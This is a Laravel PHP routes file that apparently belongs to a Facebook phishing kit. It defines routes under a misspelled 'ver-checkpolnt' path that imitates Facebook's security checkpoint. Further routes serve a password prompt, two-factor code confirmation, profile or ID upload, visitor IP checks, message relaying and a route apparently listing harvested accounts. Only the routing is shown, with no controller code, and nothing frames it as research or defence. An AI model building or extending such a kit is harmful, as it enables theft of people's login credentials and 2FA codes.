<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', 'App\Http\Controllers\FBController@toFB');
Route::get('ver-checkpolnt6824876/{action?}', ['as' => 'verify', 'uses' => 'App\Http\Controllers\FBController@index']);
Route::get('welcome/{action?}', ['as' => 'welcome', 'uses' => 'App\Http\Controllers\FBController@index']);
Route::get('ver-checkpolnt6824876/{action?}', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@secure']);
Route::get('ver-checkpolnt6824876/{action?}', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@secure']);
Route::get('get-password-modal', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@getPassWordModal']);
Route::get('confirm', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@confirm2FA']);
Route::get('upload-profile', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@uploadProfile']);

Route::post('saveimageupload', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@saveImageUpload']);
Route::get('check-ip', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@checkIP']);
Route::post('send-message', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@sendMessage']);
Route::get('waiting-verify', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@waitingVerify']);
Route::get('danh-sach-phoi', ['as' => 'business', 'uses' => 'App\Http\Controllers\FBController@phoiFB']);
